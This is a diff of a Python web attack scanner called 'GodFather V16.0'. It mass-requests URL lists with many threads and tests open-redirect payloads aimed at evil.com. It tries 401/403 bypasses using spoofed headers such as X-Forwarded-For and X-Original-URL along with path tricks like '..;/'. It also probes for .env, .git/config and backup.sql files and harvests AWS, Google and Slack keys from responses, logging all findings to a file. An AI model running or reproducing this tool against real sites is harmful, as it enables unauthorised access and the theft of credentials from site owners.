@@ -4,22 +4,33 @@ import argparse
 import urllib3
 import os
 import sys
-from concurrent.futures import ThreadPoolExecutor
-from urllib.parse import urljoin, urlparse
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
 from colorama import Fore, init, Style
 
-# Settings
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 init(autoreset=True)
 
+session = requests.Session()
+adapter = requests.adapters.HTTPAdapter(
+    pool_connections=1000, 
+    pool_maxsize=1500, 
+    max_retries=0
+)
+session.mount('http://', adapter)
+session.mount('https://', adapter)
+
 stats = {"ep": 0, "ky": 0, "or": 0, "bp": 0, "sf": 0, "scanned": 0, "total": 0, "live": 0}
 seen_secrets = set() 
-seen_files = set()
+seen_paths = set() 
 processed_urls = set()
 
-EXCLUDED_EXTENSIONS = ('.css', '.png', '.jpg', '.jpeg', '.gif', '.woff', '.woff2', '.ttf', '.svg', '.eot', '.ico', '.mp4')
-SENSITIVE_PATHS = ['/.env', '/.git/config', '/.aws/credentials', '/config.php.bak']
-SENS_KEYWORDS = ["AWS_ACCESS_KEY", "AWS_SECRET", "DB_PASSWORD", "SECRET_KEY", "repositoryformatversion", "[default]"]
+OR_PAYLOADS = ["https://www.bing.com", "//www.bing.com", "/\\/bing.com", "/%0d%0abing.com"]
+BYPASS_HEADERS = [
+    {'X-Forwarded-For': '127.0.0.1'}, {'X-Forwarded-Host': '127.0.0.1'},
+    {'X-Original-URL': '/admin'}, {'X-Rewrite-URL': '/admin'},
+    {'X-Remote-IP': '127.0.0.1'}, {'X-Custom-IP-Authorization': '127.0.0.1'}
+]
 
 def print_banner():
     banner = f"""
@@ -27,20 +38,12 @@ def print_banner():
 {Fore.RED}    ██╔════╝ ██╔═══██╗██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██║  ██║██╔════╝██╔══██╗
 {Fore.RED}    ██║  ███╗██║   ██║██║  ██║█████╗  ███████║   ██║   ███████║█████╗  ██████╔╝
 {Fore.RED}    ██║   ██║██║   ██║██║  ██║██╔══╝  ██╔══██║   ██║   ██╔══██║██╔══╝  ██╔══██╗
-{Fore.RED}    ╚██████╔╝╚██████╔╝██████╔╝██║     ██║  ██║   ██║   ██║  ██║███████╗██║  ██║
+{Fore.RED}    ╚██████╔╝╚██████╔╝██████╔╝██║      ██║  ██║   ██║   ██║  ██║███████╗██║  ██║
 {Fore.WHITE}    -----------------------------------------------------------------------
 {Fore.YELLOW}      SENSITIVE DATA CAN HIDE, BUT IT CAN'T ESCAPE THE GODFATHER.
-{Fore.CYAN}                 MADE BY DHARMVEER | GODFATHER V16.0
+{Fore.CYAN}                 MADE BY DHARMVEER | GOD-FATHER V16.0
     """
     print(banner)
-
-PATTERNS = {
-    "CLOUD_KEY": r"(AIza[0-9A-Za-z\-_]{35}|AKIA[0-9A-Z]{16}|ghp_[a-zA-Z0-9]{36}|SG\.[0-9a-zA-Z\-_]{22}\.[0-9a-zA-Z\-_]{43})",
-    "ENDPOINT": r'["\'](/(?:api|v[0-9]|graphql|admin|auth|checkout)/[a-zA-Z0-9\-_/.]+)["\']'
-}
-
-PAYLOAD = "https://www.bing.com"
-OR_PARAMS = ['url', 'next', 'dest', 'destination', 'callback', 'redirect', 'goto']
 
 def update_status():
     perc = (stats['scanned'] / stats['total']) * 100 if stats['total'] > 0 else 0
@@ -48,153 +51,206 @@ def update_status():
     sys.stdout.write(status_line)
     sys.stdout.flush()
 
-def log_result(text, color=Fore.WHITE):
-    sys.stdout.write(f"\r\033[K{color}{text}\n")
+def log_result(label, value, source_url, color=Fore.WHITE, is_vuln=False):
+    if label == "CLOUD_KEY":
+        output = f"{color}[{label}] {Fore.WHITE}{value} | {Fore.CYAN}{source_url}"
+    elif is_vuln:
+        output = f"{Fore.MAGENTA}!!! [VULNERABLE-OR] {value} !!!"
+    else:
+        output = f"{color}[{label}] {value}"
+    
+    sys.stdout.write(f"\r\033[K{output}\n")
     update_status()
 
 def save_to_file(output_file, data_type, value, source):
     if not output_file: return
-    mode = 'a' if os.path.exists(output_file) else 'w'
-    with open(output_file, mode, encoding='utf-8') as f:
-        if output_file.endswith(".html"):
-            if mode == 'w': f.write("<html><body style='background:#111;color:#eee;font-family:monospace;'><h1>GodFather Report</h1><hr>")
-            f.write(f"<p><b style='color:yellow'>[{data_type}]</b> {value} <br><small>Source: {source}</small></p><hr>\n")
-        else:
-            f.write(f"[{data_type}] {value} in {source}\n")
-        f.flush()
+    with open(output_file, 'a', encoding='utf-8') as f:
+        f.write(f"[{data_type}] {value} | {source}\n")
 
-def test_403_bypass(url, output_file):
-    headers = [{'X-Forwarded-For': '127.0.0.1'}, {'X-Original-URL': '/'}]
-    for header in headers:
-        try:
-            r = requests.get(url, headers=header, timeout=4, verify=False, allow_redirects=False)
-            if r.status_code == 200 and any(key in r.text.upper() for key in SENS_KEYWORDS):
-                log_result(f"!!! [403-BYPASS] {url} with {header} !!!", Fore.YELLOW + Style.BRIGHT)
-                stats["bp"] += 1
-                save_to_file(output_file, "403-BYPASS", str(header), url)
-        except: pass
+def test_or_poc(url, output_file):
+    try:
+        parsed_url = urlparse(url)
+        if not parsed_url.query: return
+        params = parse_qs(parsed_url.query)
+        target_keys = ['url', 'redirect', 'next', 'dest', 'path', 'uri', 'to', 'out', 'domain', 'host']
+        EVIL_PAYLOADS = ["https://evil.com", "//evil.com", "/\\/evil.com", "https://evil.com%0d%0a.whitelisted.com"]
+        for key in params:
+            if any(tk in key.lower() for tk in target_keys):
+                orig_val = params[key]
+                for payload in EVIL_PAYLOADS:
+                    params[key] = [payload]
+                    test_url = urlunparse(parsed_url._replace(query=urlencode(params, doseq=True)))
+                    try:
+                        r = session.get(test_url, timeout=4, verify=False, allow_redirects=False)
+                        loc = r.headers.get('Location', '')
+                        if r.status_code in [301, 302, 303, 307, 308] and "evil.com" in loc:
+                            log_result("VULN-OR", test_url, url, Fore.MAGENTA + Style.BRIGHT, is_vuln=True)
+                            stats["or"] += 1
+                            save_to_file(output_file, "OPEN-REDIRECT", test_url, url)
+                            params[key] = orig_val
+                            return 
+                    except: pass
+                params[key] = orig_val
+    except: pass
 
-def hunt_sensitive_files(base_url, output_file):
-    parsed = urlparse(base_url)
-    root_url = f"{parsed.scheme}://{parsed.netloc}"
-    if root_url in seen_files: return
-    seen_files.add(root_url)
-    for path in SENSITIVE_PATHS:
-        try:
-            target = root_url + path
-            r = requests.get(target, timeout=4, verify=False, allow_redirects=False)
-            if r.status_code == 200 and any(key in r.text.upper() for key in SENS_KEYWORDS):
-                log_result(f"[CONFIRMED-FILE] {target}", Fore.GREEN + Style.BRIGHT)
-                stats["sf"] += 1
-                save_to_file(output_file, "SENSITIVE-FILE", target, "File Hunt")
-        except: pass
+def try_bypass(url, output_file):
+    try:
+        original_r = session.get(url, timeout=4, verify=False, allow_redirects=False)
+        orig_status = original_r.status_code
+        orig_size = len(original_r.content)
+    except: return False
+    if orig_status == 200: return False
+    fuzz_paths = [url, url + "/%2e/", url + "..;/"] 
+    for f_path in fuzz_paths:
+        for header in BYPASS_HEADERS:
+            try:
+                r = session.get(f_path, headers=header, timeout=4, verify=False, allow_redirects=False)
+                if r.status_code == 200 and len(r.content) != orig_size and len(r.content) > 100:
+                    low_content = r.text.lower()
+                    bad_keywords = ["access denied", "forbidden", "unauthorized", "login", "signin"]
+                    if not any(word in low_content for word in bad_keywords):
+                        log_result("BP-SUCCESS", f"{f_path} (Header: {list(header.keys())[0]})", url, Fore.YELLOW + Style.BRIGHT)
+                        stats["bp"] += 1
+                        save_to_file(output_file, "BYPASS-SUCCESS", f_path, f"Header: {list(header.keys())[0]}")
+                        return True
+            except: pass
+    return False
 
 def scan_logic(content, source_url, output_file, args):
-    # Secret/Key Hunting (-ky)
-    if args.ky or args.all:
-        for name, pat in [("CLOUD_KEY", PATTERNS["CLOUD_KEY"])]:
-            matches = re.findall(pat, content)
-            for val in matches:
-                if len(str(val)) < 6 or str(val) in seen_secrets: continue
-                log_result(f"[CLOUD_KEY] {val} in {source_url}", Fore.RED + Style.BRIGHT)
-                stats["ky"] += 1
-                seen_secrets.add(str(val))
-                save_to_file(output_file, "CLOUD_KEY", val, source_url)
-
-    # Endpoint Hunting (-ep)
     if args.ep or args.all:
-        matches = re.findall(PATTERNS["ENDPOINT"], content)
-        for val in matches:
-            if len(str(val)) < 6 or str(val) in seen_secrets: continue
-            log_result(f"[ENDPOINT] {val} in {source_url}", Fore.CYAN)
+        ep_pat = r'["\'](/(?:api|v[0-9]|v3|graphql|admin|auth|config|internal|web-api|rest|hidden|debug|v4)/[a-zA-Z0-9\-_/.]+)["\']|["\'](https?://[a-zA-Z0-9.\-_/]+(?:api|v[0-9]|v3|graphql|internal|debug|v4)[a-zA-Z0-9.\-_/]*)["\']'
+        for match in re.findall(ep_pat, content):
+            val = match[0] if match[0] else match[1]
+            val_lower = val.lower()
+            media_exts = ('.jpg', '.jpeg', '.png', '.gif', '.svg', '.pdf', '.woff', '.woff2', '.ttf', '.eot', '.mp4', '.css', '.ico', '.js', '.map', '.txt', '.zip')
+            junk_paths = ('/uploads/', '/assets/', '/static/', '/media/', '/images/', 'google-analytics', 'twitter.com', 'facebook.com', 'fonts.', 'cloudinary.', 'instagram.')
+            if not val or any(val_lower.endswith(ext) for ext in media_exts) or any(jp in val_lower for jp in junk_paths):
+                continue
+            path_sig = re.sub(r'/\d+', '/{ID}', val)
+            if path_sig in seen_paths: continue
+            seen_paths.add(path_sig)
+            gold_keys = ['admin', 'config', 'internal', 'env', 'secret', 'auth', 'setup', 'db', 'sql', 'debug', 'monitor', 'backup', 'vault', 'login', 'signin', 'logout']
+            is_gold = any(gk in val_lower for gk in gold_keys)
+            label = "GOLDMINE-EP" if is_gold else "ENDPOINT"
+            color = Fore.CYAN + Style.BRIGHT if is_gold else Fore.CYAN
+            log_result(label, val, source_url, color)
             stats["ep"] += 1
-            seen_secrets.add(str(val))
-            save_to_file(output_file, "ENDPOINT", val, source_url)
-    
-    # Open Redirect (-poc)
-    if args.poc or args.all:
-        for p in OR_PARAMS:
-            if f"{p}=" in source_url.lower():
-                try:
-                    test_url = f"{source_url.split('?')[0]}?{p}={PAYLOAD}"
-                    r = requests.get(test_url, timeout=4, verify=False, allow_redirects=False)
-                    if r.status_code in [301, 302, 307, 308] and PAYLOAD in r.headers.get('Location', ''):
-                        log_result(f"!!! [VULNERABLE-OR] {test_url} !!!", Fore.MAGENTA + Style.BRIGHT)
-                        stats["or"] += 1
-                        save_to_file(output_file, "OPEN-REDIRECT", test_url, "OR Hunt")
-                except: pass
+            save_to_file(output_file, label, val, source_url)
+    if args.ky or args.all:
+        patterns = {
+            "GOOGLE_KEY": r'\bAIza[0-9A-Za-z\-_]{35}\b',
+            "AWS_ACCESS_KEY": r'\b(?:AKIA|ASIA)[0-9A-Z]{16}\b',
+            "SLACK_TOKEN": r'\bxox[baprs]-[0-9a-zA-Z]{10,48}\b'
+        }
+        for label, pat in patterns.items():
+            for m in re.findall(pat, content):
+                if m not in seen_secrets:
+                    if len(set(m)) < 6: continue 
+                    display_msg = f"{m} {Fore.WHITE}at {Fore.BLUE}{source_url}"
+                    log_result(label, display_msg, source_url, Fore.RED + Style.BRIGHT)
+                    seen_secrets.add(m)
+                    stats["ky"] += 1
+                    save_to_file(output_file, label, m, f"Found at: {source_url}")
 
 def process_url(url, args):
     if url in processed_urls: return
     processed_urls.add(url)
-    if len(url) > 400 or url.lower().endswith(EXCLUDED_EXTENSIONS):
-        stats["scanned"] += 1
-        return
     try:
-        target_url = url if url.startswith('http') else urljoin(args.domain or "", url)
-        
-        # Sensitive File Hunt (-sf)
         if args.sf or args.all:
-            hunt_sensitive_files(target_url, args.output)
-            
-        r = requests.get(target_url, headers={'User-Agent': 'Mozilla/5.0'}, timeout=6, verify=False)
-        
+            parsed = urlparse(url)
+            base = f"{parsed.scheme}://{parsed.netloc}"
+            fuzz_paths = ['.env', '.git/config', 'phpinfo.php', 'config.json', 'backup.sql', 'Dockerfile']
+            for sf_p in fuzz_paths:
+                f_url = f"{base.rstrip('/')}/{sf_p.lstrip('/')}"
+                if f_url in processed_urls: continue
+                processed_urls.add(f_url)
+                try:
+                    sr = session.get(f_url, timeout=3, verify=False, allow_redirects=True, headers={'User-Agent': 'Mozilla/5.0'}, stream=True)
+                    if sr.status_code == 200:
+                        content_sample = sr.raw.read(1000).decode('utf-8', errors='ignore').lower()
+                        forbidden = ["access denied", "forbidden", "unauthorized", "waf", "security challenge"]
+                        not_found = ["page not found", "not found", "404", "doesn't exist", "invalid request"]
+                        c_len = int(sr.headers.get('Content-Length', 0))
+                        if (c_len > 500 or len(content_sample) > 500):
+                            if not any(w in content_sample for w in forbidden) and not any(nf in content_sample for nf in not_found):
+                                if "<html>" not in content_sample or "json" in f_url or "phpinfo" in f_url:
+                                    log_result("SENS-FILE", f_url, url, Fore.GREEN + Style.BRIGHT)
+                                    stats["sf"] += 1
+                                    save_to_file(args.output, "SENSITIVE-FILE", f_url, "Auto-Fuzz")
+                except: pass   
+        if args.poc or args.all: test_or_poc(url, args.output)
+        r = session.get(url, timeout=5, verify=False, headers={'User-Agent': 'Mozilla/5.0'})
         if r.status_code == 200:
             if args.verify: stats["live"] += 1
-            scan_logic(r.text, target_url, args.output, args)
-        elif r.status_code == 403 and (args.poc or args.all):
-            test_403_bypass(target_url, args.output)
-            
+            if any(x in url.lower() for x in ['.env', 'config.json', 'phpinfo.php', 'backup.sql']):
+                c_text = r.text.lower()
+                if len(r.content) > 100 and not any(w in c_text for w in ["access denied", "forbidden"]):
+                    log_result("SENS-FILE", url, url, Fore.GREEN + Style.BRIGHT)
+                    stats["sf"] += 1
+                    save_to_file(args.output, "SENSITIVE-FILE", url, "Direct-Hit")
+            scan_logic(r.text, url, args.output, args)
+        elif r.status_code in [401, 403] and (args.bp or args.all):
+            try_bypass(url, args.output)
     except: pass
     stats["scanned"] += 1
-    if stats["scanned"] % 10 == 0: update_status()
 
 def main():
-    print_banner()
-    parser = argparse.ArgumentParser(formatter_class=lambda prog: argparse.RawTextHelpFormatter(prog, max_help_position=40, width=110), add_help=False)
-    
-    parser.add_argument("-h", "--help", action="help", help="Show this help message")
-    
-    req = parser.add_argument_group(f'{Fore.RED}REQUIRED')
-    req.add_argument("-i", "--input", required=True, help="Input URL/Path list")
-
-    config = parser.add_argument_group(f'{Fore.CYAN}SETTINGS')
-    config.add_argument("-d", "--domain", help="Base domain for partial paths")
-    config.add_argument("-t", "--threads", type=int, default=100, help="Threads (Default: 100)")
-    config.add_argument("-o", "--output", default=None, help="Output file (.txt/.html)")
-
-    modes = parser.add_argument_group(f'{Fore.GREEN}SCAN MODES (Manual Selection)')
-    modes.add_argument("-ky", action="store_true", help="Hunt for Secrets/Keys")
-    modes.add_argument("-ep", action="store_true", help="Hunt for API Endpoints")
-    modes.add_argument("-sf", action="store_true", help="Hunt for Sensitive Files (.env, etc.)")
-    modes.add_argument("-poc", action="store_true", help="Test for OR & 403 Bypass")
-    modes.add_argument("-v", "--verify", action="store_true", help="Verify Live status (200 OK)")
-    modes.add_argument("-all", action="store_true", help="Run ALL scans together")
+    parser = argparse.ArgumentParser(add_help=False)
+    parser.add_argument("-i", "--input")
+    parser.add_argument("-t", "--threads", type=int, default=150)
+    parser.add_argument("-o", "--output", default="results.txt")
+    parser.add_argument("-d", "--domain")
+    parser.add_argument("-v", "--verify", action="store_true")
+    parser.add_argument("-ky", action="store_true")
+    parser.add_argument("-ep", action="store_true")
+    parser.add_argument("-bp", action="store_true")
+    parser.add_argument("-sf", action="store_true")
+    parser.add_argument("-poc", action="store_true")
+    parser.add_argument("-all", action="store_true")
+    parser.add_argument("-h", "--help", action="store_true")
 
     args = parser.parse_args()
-    
-    if not (args.ky or args.ep or args.sf or args.poc or args.all):
-        print(f"{Fore.YELLOW}[!] No scan mode selected. Use -ky, -ep, -sf, -poc or -all")
-        return
 
-    if args.output:
-        with open(args.output, 'w') as f: f.write("")
+    if args.help or not args.input:
+        print_banner()
+        help_menu = f"""
+{Fore.RED}{Style.BRIGHT}USAGE: python3 test.py -i <urls.txt> [OPTIONS]
 
-    if not os.path.exists(args.input):
-        print(f"{Fore.RED}[!] Error: File '{args.input}' not found!")
-        return
+{Fore.RED}{Style.BRIGHT}CORE ARGUMENTS:
+  {Fore.WHITE}-i, --input    {Fore.YELLOW}Input file containing URLs (Required)
+  {Fore.WHITE}-t, --threads  {Fore.YELLOW}Number of threads (Default: 150)
+  {Fore.WHITE}-o, --output   {Fore.YELLOW}Save results to file (Default: results.txt)
+  {Fore.WHITE}-d, --domain   {Fore.YELLOW}Filter by domain name
 
-    with open(args.input, 'r', encoding='utf-8', errors='ignore') as f:
-        urls = [line.strip() for line in f if line.strip()]
+{Fore.RED}{Style.BRIGHT}MODULES:
+  {Fore.WHITE}-v             {Fore.CYAN}Verify Live 200 OK Targets
+  {Fore.WHITE}-ky            {Fore.CYAN}Scan for API Keys (AWS, Google, etc.)
+  {Fore.WHITE}-ep            {Fore.CYAN}Extract Sensitive Endpoints & Admin Paths
+  {Fore.WHITE}-bp            {Fore.CYAN}Auto-Bypass 403/401 Restricted Pages
+  {Fore.WHITE}-sf            {Fore.CYAN}Fuzz for Sensitive Files (.env, .git, etc.)
+  {Fore.WHITE}-poc           {Fore.CYAN}Run Open Redirect POC Tests
+  {Fore.WHITE}-all           {Fore.GREEN}{Style.BRIGHT}Run All Modules (The Godfather Mode)
+
+{Fore.RED}{Style.BRIGHT}MISC:
+  {Fore.WHITE}-h, --help     {Fore.YELLOW}Show this stylish help menu
+        """
+        print(help_menu)
+        sys.exit(0)
+
+    print_banner()
+    try:
+        with open(args.input, 'r', encoding='utf-8', errors='ignore') as f:
+            urls = list(set(line.strip() for line in f if line.strip()))
+    except:
+        print(f"{Fore.RED}[!] Error: Input file '{args.input}' nahi mili!")
+        sys.exit(1)
     
     stats["total"] = len(urls)
-    try:
-        with ThreadPoolExecutor(max_workers=args.threads) as executor:
-            for url in urls: executor.submit(process_url, url, args)
-    except KeyboardInterrupt:
-        print(f"\n{Fore.YELLOW}[!] Stopped by user.")
-    
-    print(f"\n\n{Fore.GREEN}--- HUNTING COMPLETE | MADE BY DHARMVEER ---")
+    with ThreadPoolExecutor(max_workers=args.threads) as executor:
+        futures = {executor.submit(process_url, url, args): url for url in urls}
+        for future in as_completed(futures): update_status()
+    print(f"\n\n{Fore.GREEN}--- GOD-FATHER HUNTING COMPLETE")
 
 if __name__ == "__main__":
-    main()
+    try: main()
+    except KeyboardInterrupt: sys.exit(0)
